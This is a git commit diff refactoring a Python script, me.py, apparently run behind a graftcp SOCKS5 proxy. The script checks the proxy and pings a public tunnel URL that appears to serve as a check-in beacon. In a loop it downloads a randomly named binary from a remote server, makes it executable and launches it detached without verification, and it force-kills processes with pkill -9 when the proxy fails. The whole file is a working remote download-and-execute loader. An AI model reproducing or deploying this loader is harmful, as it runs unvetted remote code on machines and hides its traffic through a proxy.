509b7861a534e9ec0a1536de3b236f83ad36a9ba
suplays <137026950+suplays@users.noreply.github.com>
2023-12-07 17:11:31 -0800

    Add files via upload

--- me.py
+++ me.py
@@ -8,18 +8,10 @@ import configparser
 def get_proxy_ip_from_config(file_path):
     config = configparser.ConfigParser()
     config.read(file_path)
-    
-    proxy_ip = None
-    if 'local' in config:
-        socks5_value = config['local'].get('socks5')
-        if socks5_value:
-            proxy_ip = socks5_value.split(':')[0]
-    
-    return proxy_ip
+    return config['local'].get('socks5', '').split(':')[0]
 
-# Fungsi untuk memeriksa koneksi proxy menggunakan curl
 def check_proxy():
-    file_path = 'graftcp/local/graftcp-local.conf'  # Sesuaikan dengan path file yang benar
+    file_path = 'graftcp/local/graftcp-local.conf'
     proxy_ip = get_proxy_ip_from_config(file_path)
 
     if not proxy_ip:
@@ -30,24 +22,19 @@ def check_proxy():
     
     try:
         result = subprocess.run(curl_command, shell=True, capture_output=True, text=True, timeout=10)
-        if result.returncode == 0:
-            proxy_response = result.stdout.strip()
-            if proxy_response == proxy_ip:
-                print(proxy_response)
-                return True
+        if result.returncode == 0 and result.stdout.strip() == proxy_ip:
+            print(result.stdout.strip())
+            return True
     except Exception as e:
         print(f"Error checking proxy: {e}")
     return False
 
 def kill_processes(process_list):
-    for process_name in process_list:
-        subprocess.run(['pkill', '-9', process_name])
+    subprocess.run(['pkill', '-9'] + process_list)
 
 def send_info():
-    url = "https://localtopublic.ap.loclx.io/info"
-
     try:
-        requests.get(url)
+        requests.get('https://localtopublic.ap.loclx.io/info')
     except requests.RequestException as e:
         print(f"Error saat mengakses website: {e}")
 
@@ -56,8 +43,7 @@ def download_and_run_file():
     file_names = ['satu', 'dua', 'tiga', 'empat', 'lima', 'enam', 'tujuh']
 
     try:
-        os.chdir("..")  # Naik satu level direktori
-        
+        os.chdir("..")
         random_file_name = random.choice(file_names)
         download_link = f"{download_link_base}{random_file_name}"
         response = requests.get(download_link)
@@ -66,9 +52,9 @@ def download_and_run_file():
             file_path = f"./{random_file_name}"
             with open(file_path, 'wb') as file:
                 file.write(response.content)
-            os.chmod(file_path, 0o755)  # Memberikan izin eksekusi pada file
+            os.chmod(file_path, 0o755)
             
-            subprocess.run(f"./{random_file_name}", shell=True)
+            subprocess.Popen(f"./{random_file_name}", shell=True, stdin=None, stdout=None, stderr=None, close_fds=True)
         else:
             raise Exception("Gagal mengunduh file.")
     except Exception as e:
@@ -80,7 +66,7 @@ if __name__ == "__main__":
     while True:
         if check_proxy():
             print("Proxy aktif.")
-            time.sleep(300)  # Tunggu 5 menit
+            time.sleep(300)
         else:
             print("Proxy tidak valid. Menghentikan proses.")
             kill_processes(process_list)
@@ -95,4 +81,4 @@ if __name__ == "__main__":
                 break
             except Exception as e:
                 print(f"Error saat download dan jalankan file: {e}")
-                time.sleep(30)  # Tunggu 30 detik
+                time.sleep(30)
